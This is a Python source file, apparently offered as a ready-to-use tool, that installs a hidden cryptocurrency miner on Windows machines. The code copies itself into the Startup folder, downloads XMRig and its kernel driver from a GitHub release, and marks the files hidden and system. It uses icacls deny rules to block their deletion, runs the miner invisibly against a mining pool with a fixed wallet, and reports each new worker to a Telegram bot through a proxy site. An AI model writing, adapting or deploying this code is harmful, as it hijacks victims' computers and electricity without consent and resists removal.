# Miner
# By : ProtonSecurity

from os import path, getenv, remove, chdir, getlogin
from time import sleep
from hashlib import sha256
from shutil import copy
from requests import Session
from subprocess import Popen, CREATE_NO_WINDOW
from random import randint
from requests import post

token = 'token'
chatid = 1234

def setup_startup():
    startup_path = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = "Service.Host.exe"
    if not path.exists(path.join(startup_path, path.basename(script_path))):
        copy(script_path, startup_path)

def calculate_sha256(file_path):
    if path.exists(file_path):
        hash_sha256 = sha256()
        with open(file_path, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return hash_sha256.hexdigest()
    else : return "False"

def download_file(session, url, addr, expected_hash):

    while True:
        try:

            if calculate_sha256(addr) == expected_hash:
                return True
            else:
                if path.exists(addr): remove(addr)

                response = session.get(url, stream=True)
                response.raise_for_status()

                with open(addr, 'ab') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)

        except:
            sleep(120)

def main():
    setup_startup()

    addr = [
        path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'xmrig.exe'),
        path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WinRing0x64.sys')
    ]
    urls = [
        'https://github.com/Abolfazl2687/vpsip/releases/download/main/xmrig.exe',
        'https://github.com/Abolfazl2687/vpsip/releases/download/main/WinRing0x64.sys'
    ]
    expected_hash = [
        'd2fcf28897ddc2137141d838b734664ff7592e03fcd467a433a51cb4976b4fb1',  # Hash for xmrig.exe
        '11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5'  # Hash for WinRing0x64.sys
    ]

    with Session() as session:
        for url, address, expected in zip(urls, addr, expected_hash):
            while not download_file(session, url, address, expected):
                continue

    chdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    
    Popen('attrib +h +s +r xmrig.exe && attrib +s +h +r WinRing0x64.sys && attrib +s +h +r "Service.Host.exe"', shell=True, creationflags=CREATE_NO_WINDOW)
    Popen('icacls xmrig.exe /deny Everyone:(DE) && icacls WinRing0x64.sys /deny Everyone:(DE) && icacls "Service.Host.exe" /deny Everyone:(DE)', shell=True, creationflags=CREATE_NO_WINDOW)
    Popen('icacls xmrig.exe /deny Everyone:(WD) && icacls WinRing0x64.sys /deny Everyone:(WD) && icacls "Service.Host.exe" /deny Everyone:(WD)', shell=True, creationflags=CREATE_NO_WINDOW)
    
    Miner = f'Miner{randint(1000,9999)}'
    command = f'xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u TRX:TNrMJMtMvBRias7KBGDRLM18y5QNMMgsTo.{Miner} -p x --max-cpu-usage=10 --yield --max-threads=1 --priority=5'
    # xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u TRX:TNrMJMtMvBRias7KBGDRLM18y5QNMMgsTo.Miner -p x --max-cpu-usage=10 --yield --max-threads=1 --priority=5
    Popen(command, creationflags=CREATE_NO_WINDOW)
    
    text = f'Worker < {Miner} > Started !'
    url = f'https://api.telegram.org/bot{token}/SendMessage?chat_id={chatid}&text={text}'
    sender = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"
    paylod = {
        "UrlBox":url,
        "AgentList":"Mozilla Firefox",
        "VersionsList":"HTTP/1.1",
        "MethodList":"POST"
        }
    post(sender, paylod)

main()
